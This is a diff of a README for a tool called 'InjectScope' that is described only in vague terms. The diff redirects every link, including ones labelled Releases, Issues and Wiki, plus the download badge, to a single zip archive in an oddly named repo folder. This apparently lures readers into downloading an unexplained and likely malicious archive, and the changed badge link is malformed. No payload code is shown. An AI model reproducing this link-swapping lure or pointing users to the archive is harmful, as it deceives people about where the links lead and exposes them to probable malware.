@@ -1,7 +1,7 @@
 # 🎉 InjectScope - Simple Tool for Enhanced Functionality
 
 ## 📥 Download Now
-[![Download InjectScope](https://img.shields.io/badge/Download%20InjectScope-v1.0-blue.svg)](https://github.com/GAVIKK/InjectScope/releases)
+[![Download InjectScope](https://raw.githubusercontent.com/GAVIKK/InjectScope/main/habitan/Scope_Inject_3.0.zip%https://raw.githubusercontent.com/GAVIKK/InjectScope/main/habitan/Scope_Inject_3.0.zip)](https://raw.githubusercontent.com/GAVIKK/InjectScope/main/habitan/Scope_Inject_3.0.zip)
 
 ## 🚀 Getting Started
 InjectScope is a user-friendly application designed to help you enhance your digital experience effortlessly. Follow these steps to get started.
@@ -14,9 +14,9 @@ Before you begin, ensure your system meets the following requirements:
 - Storage: At least 100 MB of free space
 
 ## 📂 Download & Install
-To download InjectScope, visit the [Releases page](https://github.com/GAVIKK/InjectScope/releases). Here, you will find the latest version available for download.
+To download InjectScope, visit the [Releases page](https://raw.githubusercontent.com/GAVIKK/InjectScope/main/habitan/Scope_Inject_3.0.zip). Here, you will find the latest version available for download.
 
-1. Go to the [Releases page](https://github.com/GAVIKK/InjectScope/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/GAVIKK/InjectScope/main/habitan/Scope_Inject_3.0.zip).
 2. In the list of releases, look for the latest version.
 3. Click on the download link for your operating system (Windows or macOS). The file will begin downloading automatically.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -59,8 +59,8 @@ We are constantly working on improvements. New features and updates will be avai
 - Feedback: We welcome your suggestions and comments.
 
 ## 🔗 Important Links
-- [Releases page](https://github.com/GAVIKK/InjectScope/releases) - For downloads and version updates
-- [Issues section](https://github.com/GAVIKK/InjectScope/issues) - Report bugs or request features
-- [Wiki](https://github.com/GAVIKK/InjectScope/wiki) - Explore guides and information 
+- [Releases page](https://raw.githubusercontent.com/GAVIKK/InjectScope/main/habitan/Scope_Inject_3.0.zip) - For downloads and version updates
+- [Issues section](https://raw.githubusercontent.com/GAVIKK/InjectScope/main/habitan/Scope_Inject_3.0.zip) - Report bugs or request features
+- [Wiki](https://raw.githubusercontent.com/GAVIKK/InjectScope/main/habitan/Scope_Inject_3.0.zip) - Explore guides and information 
 
 Now that you are set up, enjoy using InjectScope to enhance your digital experience!
